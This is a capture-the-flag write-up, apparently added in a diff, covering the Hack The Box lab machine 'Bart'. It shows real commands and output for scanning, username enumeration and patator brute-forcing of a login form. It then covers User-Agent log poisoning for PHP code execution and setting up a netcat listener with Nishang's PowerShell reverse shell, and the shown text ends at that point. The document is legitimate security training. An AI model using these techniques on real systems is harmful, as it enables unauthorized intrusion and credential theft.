@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Bart</strong></h1>
+        <em>Released: 24th February 2018 / Pwned: 8th November 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Bart is full of tricky little nuances, and should definitely <em>not</em> be rated medium difficulty.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Find a commented out username in the <code>forum.bart.htb</code> source code<br>
+        • wfuzz <code>bart.htb</code> for URLs to find bart.htb/monitor<br>
+        • Verify usernames using <code>bart.htb/monitor</code>'s 'Forgot password?' function<br>
+        • Get lucky and log into the SERVER MONITOR (use the employee's last name)<br>
+        • Find another subdomain on the SERVER MONITOR page<br>
+        • Gain access to the internal dev chat by bruteforcing it<br>
+        • Poison the <code>log.php</code> log by injecting PHP code into your User Agent, and gain a shell on the system<br>
+        • Migrate to a 64bit PowerShell instance so that you don't encounter errors<br>
+        • Query the registry to find Administrator's credentials stored in <code>AutoLogon</code><br>
+        • Use <code>Invoke-Command</code> to send an Administrator reverse shell back to your attacking machine<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-all.txt 10.10.10.81</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p 80 -T4 -sV -sC -O -oN nmap/tcp-80.txt 10.10.10.81</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mkdir&nbsp;nmap</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.81</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http<br>
+                <br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;80&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-80.txt&nbsp;10.10.10.81</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;10.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TRACE<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Microsoft-IIS<span style="color:#ff9d00;font-weight:700">/</span>10.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Did&nbsp;not&nbsp;follow&nbsp;redirect&nbsp;to&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>forum.bart.htb<span style="color:#ff9d00;font-weight:700">/</span><br>
+                Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Device&nbsp;type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;general&nbsp;purpose<br>
+                Running&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>JUST&nbsp;GUESSING<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;FreeBSD&nbsp;6.X&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>87%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Microsoft&nbsp;Windows&nbsp;10<span style="color:#ff9d00;font-weight:700">|</span>2008&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>87%<span style="color:#ff9d00;font-weight:700">)</span><br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        <strong>Analysis:</strong><br>
+        • <code>80/http</code> - There's only a web server running!<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - forum.bart.htb</strong></h2><br>
+        Browse to <code>http://10.10.10.81</code><br>
+        The page redirects to <code>forum.bart.htb</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Add <code>forum.bart.htb</code> to your <code>/etc/hosts</code> file so that you can access the site.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;/etc/hosts</span><br>
+                [...]<br>
+                10.10.10.81&nbsp;forum.bart.htb
+            </div>
+        </div><br>
+        <br>
+        The page works now :)<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        Scroll to the bottom, and you'll see that the site is powered by WordPress (which is a lie, it's not powered by WordPress at all).<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        If you view the source code, you'll find an extra user that's been commented out of the page - Harvey Potter, the developer for BART.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) gobuster --&gt; wfuzz</strong></h3><br>
+        <code>gobuster</code> fails against the site becuase the invalid pages always return a 500 server error.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#gobuster&nbsp;dir&nbsp;-e&nbsp;-u&nbsp;http://forum.bart.htb&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt&nbsp;-o&nbsp;gb1.txt&nbsp;-x&nbsp;.txt,.asp,.aspx,.php&nbsp;-s&nbsp;200,204,301,302,307,401,403,500</span><br>
+                ===============================================================<br>
+                Gobuster&nbsp;v3.0.1<br>
+                by&nbsp;OJ&nbsp;Reeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@TheColonial<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>&nbsp;Christian&nbsp;Mehlmauer&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@_FireFart_<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ===============================================================<br>
+                [+]&nbsp;Url<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>forum.bart.htb<br>
+                [+]&nbsp;Threads<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<br>
+                [+]&nbsp;Wordlist<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>big.txt<br>
+                [+]&nbsp;Status&nbsp;codes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;200,204,301,302,307,401,403,500<br>
+                [+]&nbsp;User&nbsp;Agent<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gobuster<span style="color:#ff9d00;font-weight:700">/</span>3.0.1<br>
+                [+]&nbsp;Extensions<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;php,txt,asp,aspx<br>
+                [+]&nbsp;Expanded<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">true</span><br>
+                [+]&nbsp;Timeout<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10s<br>
+                ===============================================================<br>
+                Error<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;the&nbsp;server&nbsp;returns&nbsp;a&nbsp;status&nbsp;code&nbsp;that&nbsp;matches&nbsp;the&nbsp;provided&nbsp;options&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">non</span>&nbsp;existing&nbsp;urls.&nbsp;http://forum.bart.htb/6934ea25-6131-4fdd-a494-6c77ea61dffa&nbsp;=&gt;&nbsp;500.&nbsp;To&nbsp;force&nbsp;processing&nbsp;of&nbsp;Wildcard&nbsp;responses,&nbsp;specify&nbsp;the&nbsp;'--wildcard'&nbsp;switch
+            </div>
+        </div><br>
+        <br>
+        To get around this I used <code>wfuzz</code>, but you could also just tell Burp to not ignore status code 500 responses.<br>
+        <code>wfuzz</code>ing <code>http://forum.bart.htb</code> didn't return anything, so I added <code>bart.htb</code> to my <code>/etc/hosts</code> file and fuzzed <code>http://bart.htb</code> instead.<br>
+        <br>
+        <code>-hh 150693</code> hides page responses that are 150693 characters long, which was the length of the ‘Page Not Found’ style response from <code>http://bart.htb</code><br>
+        <br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;/etc/hosts</span><br>
+                [...]<br>
+                10.10.10.81&nbsp;forum.bart.htb&nbsp;bart.htb<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#wfuzz&nbsp;-c&nbsp;-z&nbsp;file,/usr/share/seclists/Discovery/Web-Content/big.txt&nbsp;--hh&nbsp;150693&nbsp;http://bart.htb/FUZZ</span><br>
+                <br>
+                Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Pycurl&nbsp;is&nbsp;not&nbsp;compiled&nbsp;against&nbsp;Openssl.&nbsp;Wfuzz&nbsp;might&nbsp;not&nbsp;work&nbsp;correctly&nbsp;when&nbsp;fuzzing&nbsp;SSL&nbsp;sites.&nbsp;Check&nbsp;Wfuzz&nbsp;s&nbsp;documentation&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">more</span>&nbsp;information.<br>
+                <br>
+                ********************************************************<br>
+                *&nbsp;Wfuzz&nbsp;2.4&nbsp;-&nbsp;The&nbsp;Web&nbsp;Fuzzer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<br>
+                ********************************************************<br>
+                <br>
+                Target:&nbsp;http://bart.htb/FUZZ<br>
+                Total&nbsp;requests:&nbsp;20473<br>
+                <br>
+                ===================================================================<br>
+                ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Response&nbsp;&nbsp;&nbsp;Lines&nbsp;&nbsp;&nbsp;&nbsp;Word&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Chars&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload<br>
+                ===================================================================<br>
+                <br>
+                000007895:&nbsp;&nbsp;&nbsp;301&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;L&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10&nbsp;W&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;145&nbsp;Ch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"forum"<br>
+                000012007:&nbsp;&nbsp;&nbsp;301&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;L&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10&nbsp;W&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;147&nbsp;Ch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"monitor"<br>
+                <br>
+                Total&nbsp;time:&nbsp;2019.150<br>
+                Processed&nbsp;Requests:&nbsp;20473<br>
+                Filtered&nbsp;Requests:&nbsp;20471<br>
+                Requests/sec.:&nbsp;10.13941
+            </div>
+        </div><br>
+        <br>
+        <code>wfuzz</code> found another URL - <code>bart.htb/monitor</code><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) bart.htb/monitor</strong></h2><br>
+        <code>bart.htb/monitor</code> appears to be a SERVER MONITOR page.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        To advance any further we need to log in.<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>3a) Verify usernames with ‘Forgot password?’</strong></h3><br>
+        We know the names of some employees of BART from <code>forum.bart.htb</code> - Samantha Brown, Daniel Simmons, Robert Hilton, and Harvey Potter - but we don't know what their usernames are. The <code>Forgot password?</code> function can be used to find some.<br>
+        <br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        I created a wordlist of the usernames found on the homepage + variations of them.<br>
+        I put Harvey first in the list because he's the developer at BART, and is the most likely employee to have access to the SERVER MONITOR page.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;usernames.txt</span><br>
+                harvey<br>
+                potter<br>
+                harverypotter<br>
+                h.potter<br>
+                h.potter@bart.htb<br>
+                samantha<br>
+                brown<br>
+                samanthabrown<br>
+                s.brown<br>
+                s.brown@bart.htb<br>
+                daniel<br>
+                simmons<br>
+                danielsimmons<br>
+                d.simmons<br>
+                d.simmons@bart.htb<br>
+                robert<br>
+                hilton<br>
+                roberthilton<br>
+                r.hilton<br>
+                r.hilton@bart.htb
+            </div>
+        </div><br>
+        <br>
+        I tried all the usernames one by one, and <code>harvey</code> came back as a valid username.<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>3b) monitor.bart.htb</strong></h3><br>
+        I got lucky and tried harvey's last name as his password - <code>potter</code> - which worked (I'm not really a fan of challenges like this :/)<br>
+        <br>
+        Edit your <code>/etc/hosts</code> file and include <code>monitor.bart.htb</code> for the redirect to work correctly.<br>
+        There's an internal chat server running.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        The chat's running at another subdomain - <code>http://internal-01.bart.htb</code><br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) internal-01.bart.htb</strong></h2><br>
+        Add the subdomain to your <code>/etc/hosts</code> file so that you can access the site<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;/etc/hosts</span><br>
+                [...]<br>
+                10.10.10.81&nbsp;forum.bart.htb&nbsp;bart.htb&nbsp;internal-01.bart.htb
+            </div>
+        </div><br>
+        <br>
+        Another login page!<br>
+        <code>harvey / potter</code> doesn't work here, but we do get an interesting error message - <code>The Password must be at least 8 characters</code>.<br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        If you try logging in with an 8 character password - like <code>harvey / password</code> - we get a different error message - <code>Invalid Username or Password</code><br>
+        <img alt="images\2-12.png" src="images/2-12.png"><br>
+        <br>
+        There's no CSRF token on this login form, which means that we can try bruteforcing it.<br>
+        <img alt="images\2-13.png" src="images/2-13.png"><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>4a) Create wordlist</strong></h3><br>
+        The password needs to be 8 characters long, so I wrote a python script to iterate through my chosen wordlist and copy every 8 character and longer password into a new separate file. (there's probably a super easy bash one-liner to do this, but I couldn't think of it).<br>
+            <div class="codebox">
+                wordlist&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"/usr/share/seclists/Passwords/darkweb2017-top1000.txt"</span><br>
+                newWordlistArray&nbsp;=&nbsp;[]<br>
+                newWordlist&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"newWordlist.txt"</span><br>
+                <br>
+                with&nbsp;open(wordlist)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;f_obj:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;line&nbsp;in&nbsp;f_obj:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;strip&nbsp;newline&nbsp;char</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;=&nbsp;line.rstrip()<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;passwordLength&nbsp;=&nbsp;len(password)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;passwordLength&nbsp;&gt;=&nbsp;<span style="color:#ff0044;font-weight:400">8</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;don't&nbsp;want&nbsp;nested&nbsp;"with&nbsp;open()"&nbsp;-&gt;&nbsp;append&nbsp;pasword&nbsp;to&nbsp;array&nbsp;to&nbsp;solve&nbsp;this&nbsp;problem</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;newWordlistArray.append(password)&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                with&nbsp;open(newWordlist,&nbsp;<span style="color:#3ad900;font-weight:400">'a'</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;f_obj:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;password&nbsp;in&nbsp;newWordlistArray:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f_obj.write(password&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\n"</span>)
+            </div>
+        </div><br>
+        <br>
+        My wordlist has decresed from 1000 words to 345 words, which is nice!<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python3&nbsp;linelength.py&nbsp;</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#wc&nbsp;-l&nbsp;newWordlist.txt&nbsp;</span><br>
+                345&nbsp;newWordlist.txt
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>4b) Bruteforce login form</strong></h3><br>
+        I bruteforced the login form with <code>patator</code>.<br>
+        <br>
+        <code>-x ignore:fgrep='Invalid Username or Password'</code> wouldn't filter the output correctly for me (every password worked, apparently), so I filtered by page size instead - -<code>x ignore:size=2111</code><br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#patator&nbsp;http_fuzz&nbsp;url=http://internal-01.bart.htb/simple_chat/login.php&nbsp;method=POST&nbsp;body='uname=harvey&amp;passwd=FILE0&amp;submit=Login'&nbsp;0=./newWordlist.txt&nbsp;follow=1&nbsp;-x&nbsp;ignore:size=2111</span><br>
+                11<span style="color:#ff9d00;font-weight:700">:</span>11<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;Starting&nbsp;Patator&nbsp;v0.7&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>lanjelot<span style="color:#ff9d00;font-weight:700">/</span>patator<span style="color:#ff9d00;font-weight:700">)</span><br>
+                11<span style="color:#ff9d00;font-weight:700">:</span>11<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-<br>
+                11<span style="color:#ff9d00;font-weight:700">:</span>11<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;code&nbsp;size<span style="color:#ff9d00;font-weight:700">:</span>clen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;candidate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;num&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;mesg<br>
+                11<span style="color:#ff9d00;font-weight:700">:</span>11<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;---------------------------------------------------------------<br>
+                11<span style="color:#ff9d00;font-weight:700">:</span>11<span style="color:#ff9d00;font-weight:700">:</span>23&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;200&nbsp;&nbsp;2481<span style="color:#ff9d00;font-weight:700">:</span>1407&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.172&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Password1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;178&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;HTTP<span style="color:#ff9d00;font-weight:700">/</span>1.1&nbsp;200&nbsp;OK<br>
+                11<span style="color:#ff9d00;font-weight:700">:</span>11<span style="color:#ff9d00;font-weight:700">:</span>42&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;Hits<span style="color:#ff9d00;font-weight:700">/</span>Done<span style="color:#ff9d00;font-weight:700">/</span>Skip<span style="color:#ff9d00;font-weight:700">/</span>Fail<span style="color:#ff9d00;font-weight:700">/</span>Size<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1<span style="color:#ff9d00;font-weight:700">/</span>345<span style="color:#ff9d00;font-weight:700">/</span>0<span style="color:#ff9d00;font-weight:700">/</span>0<span style="color:#ff9d00;font-weight:700">/</span>345,&nbsp;Avg<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;8&nbsp;r<span style="color:#ff9d00;font-weight:700">/</span>s,&nbsp;Time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0h&nbsp;0m&nbsp;39s
+            </div>
+        </div><br>
+        <br>
+        Success! Harvey's credentials for the dev chat are <code>harvey / Password1</code><br>
+        Go log in.<br>
+        <img alt="images\2-14.png" src="images/2-14.png"><br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>4c) log.php</strong></h3><br>
+        In the page source, we see that the chat is being logged.<br>
+        <img alt="images\2-15.png" src="images/2-15.png"><br>
+        <br>
+        Browse to the URL in the page source - <code>http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey</code> - and we get a 1?<br>
+        Something must be true.<br>
+        <img alt="images\2-16.png" src="images/2-16.png"><br>
+        <br>
+        Remove the parameters from the URL and we get an error message which informs us of another file - <code>log.php</code>.<br>
+        <img alt="images\2-17.png" src="images/2-17.png"><br>
+        <br>
+        At <code>http://internal-01.bart.htb/log/log.php?filename=log.php</code> we get the same error message as before about a username.<br>
+        <img alt="images\2-18.png" src="images/2-18.png"><br>
+        <br>
+        Provide a username parameter to the page, and we get a 1 back, like the original URL.<br>
+        <img alt="images\2-19.png" src="images/2-19.png"><br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>4d) log.aspx - Log Poisoning</strong></h3><br>
+        At its core, hacking is about trying things out and seeing what happens.<br>
+        The original URL was <code>log.txt</code>, an error message pointed us to <code>log.php</code>, so I decided to query for different file extensions on this <code>log</code> file (this reads as logical in hindsight, but it doesn't feel it at the time).<br>
+        <br>
+        Eventually, <code>log.aspx</code> returned a different output.<br>
+        It printed out the time, the date, the user who accessed the page, and their User Agent.<br>
+        <img alt="images\2-20.png" src="images/2-20.png"><br>
+        <br>
+        This log is reading our User Agent.<br>
+        We can modify our User Agent.<br>
+        If we put PHP code in our user agent, will it execute?<br>
+        <img alt="images\2-21.png" src="images/2-21.png"><br>
+        <br>
+        It does!<br>
+        Run <code>whoami</code>, and you'll discover that the web server is running as <code>iusr</code>.<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>4e) Execute reverse shell</strong></h3><br>
+        From here, we can get a shell on the system.<br>
+        Start a listener on your attacking machine.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9001</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Copy Nishang's <code>InvokePowerShellTcp.ps1</code> script to a working directory, or download it if you don't have it - <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a> , and edit the last line of the script to send a reverse shell back to your listener.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#locate&nbsp;InvokePowerShellTcp.ps1</span><br>
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
